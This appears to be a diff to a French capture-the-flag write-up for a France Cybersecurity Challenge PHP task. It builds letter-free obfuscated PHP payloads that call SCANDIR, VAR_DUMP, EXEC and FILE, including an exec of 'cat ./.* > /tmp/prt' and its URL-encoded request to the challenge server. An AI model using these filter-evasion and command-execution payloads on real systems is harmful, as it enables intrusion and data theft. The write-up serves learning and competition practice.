@@ -140,12 +140,12 @@ En résumé dans ce code :
 
 - On récupère le caractère 'A' dans `$z`
 - On récupère le caractère 'E' dans `$r`
-- On récupère le caractère 'I' dans '$t'
-- On récupère le caractère 'O' dans '$p'
+- On récupère le caractère 'I' dans `$t`
+- On récupère le caractère 'O' dans `$p`
 - On construit la chaîne 'ORD' dans `$j`
 - On récupère le code ASCII du caractère 'b' en utilisant la fonction `ORD` dans '$d'
 - On récupère le caractère 'a' via [chr](https://www.php.net/manual/fr/function.chr.php) à partir du code ASCII de "b" qu'on décrémente (ça pourra nous servir plus tard, même si ça ne gêne pas dans l'immédiat)
-- On récupère le caractère 'U' dans '$n'
+- On récupère le caractère 'U' dans `$n`
 - On construit la chaîne de caractères ['SCANDIR'](https://www.php.net/manual/fr/function.scandir.php) dans `$h`
 - On construit la chaîne de caractères ['VAR_DUMP'](https://www.php.net/manual/fr/function.var-dump) dans `$b`
 - On appelle le tout : `VAR_DUMP(SCANDIR("."))`
@@ -155,7 +155,7 @@ On va essayer de lister les fichiers présents dans le répertoire courant sur l
 On va contrôler la taille de la chaîne générée et on va virer les commentaires et les sauts le lignes, puis on va encoder en code URL
 
 ```
-php > echo strlen('$_=[];$_=@"$_";$_=$_["!"=="@"];$z=$_;++$_;++$_;++$_;$r=++$_;++$_;++$_;++$_;$t=++$_;++$_;++$_;++$_;++$_;++$_;$p=++$_;$j = $p."RD";$d = $j("b");++$_;++$_;++$_;++$_;++$_;$n=++$
+php > echo strlen('$_=[];$_=@"$_";$_=$_["!"=="@"];$z=$_;++$_;++$_;++$_;$r=++$_;++$_;++$_;++$_;$t=++$_;++$_;++$_;++$_;++$_;++$_;$p=++$_;$j = $p."RD";$d = $j("b");++$_;++$_;++$_;++$_;++$_;$n=++$_;$h = "SC{$z}ND{$t}R";$b ="V".$z."R_D".$n."MP";$b($h(".")');
 233
 
 php > echo urlencode('$_=[];$_=@"$_";$_=$_["!"=="@"];$z=$_;++$_;++$_;++$_;$r=++$_;++$_;++$_;++$_;$t=++$_;++$_;++$_;++$_;++$_;++$_;$p=++$_;$j = $p."RD";$d = $j("b");++$_;++$_;++$_;++$_;++$_;$n=++$_;$h = "SC{$z}ND{$t}R";$b ="V".$z."R_D".$n."MP";$b($h("."));');
@@ -221,7 +221,7 @@ Idem qu'au-dessus, on va vérifier sa taille et l'encoder en caractères URL
 ```
 php > echo strlen('$_=[];$_=@"$_";$_=$_["!"=="@"];$z=$_;++$_;++$_;++$_;$r=++$_;++$_;++$_;++$_;$t=++$_;++$_;++$_;++$_;++$_;++$_;$p=++$_;$j = $p."RD";$d = $j("b");++$_;++$_;++$_;++$_;++$_;$p =
  chr(--$d);$n=++$_;$h = "{$r}X{$r}C";$v = "c{$p}t ./.* > /tmp/prt";$h($v);');
-245
+246
 
 php > echo urlencode('$_=[];$_=@"$_";$_=$_["!"=="@"];$z=$_;++$_;++$_;++$_;$r=++$_;++$_;++$_;++$_;$t=++$_;++$_;++$_;++$_;++$_;++$_;$p=++$_;$j = $p."RD";$d = $j("b");++$_;++$_;++$_;++$_;++$_;$p = chr(--$d);$n=++$_;$h = "{$r}X{$r}C";$v = "c{$p}t ./.* > /tmp/prt";$h($v);');
 %24_%3D%5B%5D%3B%24_%3D%40%22%24_%22%3B%24_%3D%24_%5B%22%21%22%3D%3D%22%40%22%5D%3B%24z%3D%24_%3B%2B%2B%24_%3B%2B%2B%24_%3B%2B%2B%24_%3B%24r%3D%2B%2B%24_%3B%2B%2B%24_%3B%2B%2B%24_%3B%2B%2B%24_%3B%24t%3D%2B%2B%24_%3B%2B%2B%24_%3B%2B%2B%24_%3B%2B%2B%24_%3B%2B%2B%24_%3B%2B%2B%24_%3B%24p%3D%2B%2B%24_%3B%24j+%3D+%24p.%22RD%22%3B%24d+%3D+%24j%28%22b%22%29%3B%2B%2B%24_%3B%2B%2B%24_%3B%2B%2B%24_%3B%2B%2B%24_%3B%2B%2B%24_%3B%24p+%3D+chr%28--%24d%29%3B%24n%3D%2B%2B%24_%3B%24h+%3D+%22%7B%24r%7DX%7B%24r%7DC%22%3B%24v+%3D+%22c%7B%24p%7Dt+.%2F.%2A+%3E+%2Ftmp%2Fprt%22%3B%24h%28%24v%29%3B
@@ -275,7 +275,13 @@ php > echo urlencode('$_=[];$_=@"$_";$_=$_["!"=="@"];$z=$_;++$_;++$_;++$_;$r=++$
 %24_%3D%5B%5D%3B%24_%3D%40%22%24_%22%3B%24_%3D%24_%5B%22%21%22%3D%3D%22%40%22%5D%3B%24z%3D%24_%3B%2B%2B%24_%3B%2B%2B%24_%3B%2B%2B%24_%3B%24r%3D%2B%2B%24_%3B%2B%2B%24_%3B%2B%2B%24_%3B%2B%2B%24_%3B%24t%3D%2B%2B%24_%3B%2B%2B%24_%3B%2B%2B%24_%3B%2B%2B%24_%3B%2B%2B%24_%3B%2B%2B%24_%3B%24p%3D%2B%2B%24_%3B%24j+%3D+%24p.%22RD%22%3B%24d+%3D+%24j%28%22b%22%29%3B%2B%2B%24_%3B%2B%2B%24_%3B%2B%2B%24_%3B%2B%2B%24_%3B%2B%2B%24_%3B%24n%3D%2B%2B%24_%3B%24h+%3D+%22SC%7B%24z%7DND%7B%24t%7DR%22%3B%24b+%3D%22V%22.%24z.%22R_D%22.%24n.%22MP%22%3B%24b%28%24h%28%22%2Ftmp%22%29%29%3B
 ```
 
-On exécute ce paylod
+On exécute ce paylod sur
+
+```
+http://challenges2.france-cybersecurity-challenge.fr:5008/?code=%24_%3D%5B%5D%3B%24_%3D%40%22%24_%22%3B%24_%3D%24_%5B%22%21%22%3D%3D%22%40%22%5D%3B%24z%3D%24_%3B%2B%2B%24_%3B%2B%2B%24_%3B%2B%2B%24_%3B%24r%3D%2B%2B%24_%3B%2B%2B%24_%3B%2B%2B%24_%3B%2B%2B%24_%3B%24t%3D%2B%2B%24_%3B%2B%2B%24_%3B%2B%2B%24_%3B%2B%2B%24_%3B%2B%2B%24_%3B%2B%2B%24_%3B%24p%3D%2B%2B%24_%3B%24j+%3D+%24p.%22RD%22%3B%24d+%3D+%24j%28%22b%22%29%3B%2B%2B%24_%3B%2B%2B%24_%3B%2B%2B%24_%3B%2B%2B%24_%3B%2B%2B%24_%3B%24n%3D%2B%2B%24_%3B%24h+%3D+%22SC%7B%24z%7DND%7B%24t%7DR%22%3B%24b+%3D%22V%22.%24z.%22R_D%22.%24n.%22MP%22%3B%24b%28%24h%28%22%2Ftmp%22%29%29%3B
+```
+
+Et on a
 
 ![image5](assets/image5.png)
 
@@ -313,8 +319,8 @@ On exécute `$b($h("/tmp/prt"))` qui fait un `VAR_DUMP(FILE("/tmp/prt"))`
 On vérifie la taille et on encode aussi
 
 ```
-php > echo strlen('$_=[];$_=@"$_";$_=$_["!"=="@"];$z=$_;++$_;++$_;++$_;$r=++$_;++$_;++$_;++$_;$t=++$_;++$_;++$_;++$_;++$_;++$_;$p=++$_;$j = $p."RD";$d = $j("b");++$_;++$_;++$_;++$_;++$_;$n=++$
-237
+php > echo strlen('$_=[];$_=@"$_";$_=$_["!"=="@"];$z=$_;++$_;++$_;++$_;$r=++$_;++$_;++$_;++$_;$t=++$_;++$_;++$_;++$_;++$_;++$_;$p=++$_;$j = $p."RD";$d = $j("b");++$_;++$_;++$_;++$_;++$_;$n=++$_;$h = "F{$t}L{$r}";$b ="V".$z."R_D".$n."MP";$b($h("/tmp/prt")');
+235
 
 php > echo urlencode('$_=[];$_=@"$_";$_=$_["!"=="@"];$z=$_;++$_;++$_;++$_;$r=++$_;++$_;++$_;++$_;$t=++$_;++$_;++$_;++$_;++$_;++$_;$p=++$_;$j = $p."RD";$d = $j("b");++$_;++$_;++$_;++$_;++$_;$n=++$_;$h = "F{$t}L{$r}";$b ="V".$z."R_D".$n."MP";$b($h("/tmp/prt"));');
 %24_%3D%5B%5D%3B%24_%3D%40%22%24_%22%3B%24_%3D%24_%5B%22%21%22%3D%3D%22%40%22%5D%3B%24z%3D%24_%3B%2B%2B%24_%3B%2B%2B%24_%3B%2B%2B%24_%3B%24r%3D%2B%2B%24_%3B%2B%2B%24_%3B%2B%2B%24_%3B%2B%2B%24_%3B%24t%3D%2B%2B%24_%3B%2B%2B%24_%3B%2B%2B%24_%3B%2B%2B%24_%3B%2B%2B%24_%3B%2B%2B%24_%3B%24p%3D%2B%2B%24_%3B%24j+%3D+%24p.%22RD%22%3B%24d+%3D+%24j%28%22b%22%29%3B%2B%2B%24_%3B%2B%2B%24_%3B%2B%2B%24_%3B%2B%2B%24_%3B%2B%2B%24_%3B%24n%3D%2B%2B%24_%3B%24h+%3D+%22F%7B%24t%7DL%7B%24r%7D%22%3B%24b+%3D%22V%22.%24z.%22R_D%22.%24n.%22MP%22%3B%24b%28%24h%28%22%2Ftmp%2Fprt%22%29%29%3B
